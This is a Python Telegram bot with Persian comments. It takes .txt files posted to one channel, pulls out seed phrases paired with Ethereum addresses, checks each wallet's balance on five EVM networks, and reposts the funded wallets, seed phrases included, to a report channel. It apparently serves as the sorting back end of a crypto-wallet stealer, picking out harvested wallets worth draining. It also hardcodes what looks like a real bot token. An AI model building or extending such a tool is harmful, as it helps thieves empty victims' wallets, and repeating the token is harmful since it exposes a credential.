import os
import re
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters
from web3 import Web3
from keep_alive import keep_alive

# --- تنظیمات دقیق ---
BOT_TOKEN = '8668017334:AAHMHyPg_LAlYtzlcggKGhBjbGHXNLspylk'
SOURCE_CHANNEL = '@rrxfq'           # کانالی که فایل‌ها در آن آپلود می‌شوند
REPORT_CHANNEL_ID = '@regroupmywallet' # کانالی که گزارش‌ها به آن ارسال می‌شوند

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
    'POLYGON': 'https://polygon-rpc.com',
    'ARB': 'https://arb1.arbitrum.io/rpc',
    'OP': 'https://mainnet.optimism.io'
}

def check_all_balances(address):
    results = {}
    for name, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 7}))
            checksum_addr = Web3.to_checksum_address(address.strip())
            bal_wei = w3.eth.get_balance(checksum_addr)
            amount = float(w3.from_wei(bal_wei, 'ether'))
            results[name] = amount
        except:
            results[name] = 0.0
    return results

async def process_report_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # بررسی اینکه فایل حتماً از کانال سورس آمده باشد
    if update.channel_post.chat.username != SOURCE_CHANNEL.replace('@', ''):
        return

    doc = update.channel_post.document
    if not doc or not doc.file_name.endswith('.txt'):
        return

    # ارسال پیام شروع پردازش در کانال گزارش
    await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"📥 فایل جدید در `{SOURCE_CHANNEL}` یافت شد.\n📄 نام فایل: `{doc.file_name}`\n⏳ در حال محاسبه موجودی کل...")

    try:
        file = await context.bot.get_file(doc.file_id)
        content_bytes = await file.download_as_bytearray()
        content = content_bytes.decode('utf-8', errors='ignore')

        addresses = re.findall(r"Addr:\s*(0x[a-fA-F0-9]{40})", content)
        phrases = re.findall(r"Phrase:\s*(.*?)\s*(?:\[|Addr:|$)", content, re.DOTALL)
        wallets = list(zip(phrases, addresses))

        if not wallets:
            await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"❌ در فایل `{doc.file_name}` آدرسی پیدا نشد.")
            return

        total_summary = {net: 0.0 for net in NETWORKS.keys()}
        rich_details = ""
        
        for phrase, addr in wallets:
            balances = check_all_balances(addr)
            has_money = False
            wallet_info = f"\n💎 **Rich Wallet:**\n🔑 `{phrase.strip()}`\n📍 `{addr}`\n"
            
            for net, amount in balances.items():
                total_summary[net] += amount
                if amount > 0:
                    has_money = True
                    wallet_info += f"   - {net}: `{amount:.6f}`\n"
            
            if has_money:
                rich_details += wallet_info

        # ساخت گزارش نهایی
        report = f"📊 **گزارش نهایی فایل:** `{doc.file_name}`\n"
        report += f"📁 منبع: {SOURCE_CHANNEL}\n"
        report += f"🔢 تعداد کل ولت‌ها: {len(wallets)}\n"
        report += "──────────────────\n"
        report += "💰 **مجموع موجودی این فایل:**\n"
        for net, total in total_summary.items():
            report += f"   - {net}: `{total:.6f}`\n"

        await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=report, parse_mode='Markdown')

        if rich_details:
            # ارسال جزئیات ولت‌های پول‌دار
            for i in range(0, len(rich_details), 4000):
                await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=rich_details[i:i+4000], parse_mode='Markdown')

    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    keep_alive()
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # فیلتر کردن پیام‌ها: فقط پست‌های کانال که فایل (Document) دارند
    channel_filter = filters.ChatType.CHANNEL & filters.Document.ALL
    application.add_handler(MessageHandler(channel_filter, process_report_file))
    
    application.run_polling()
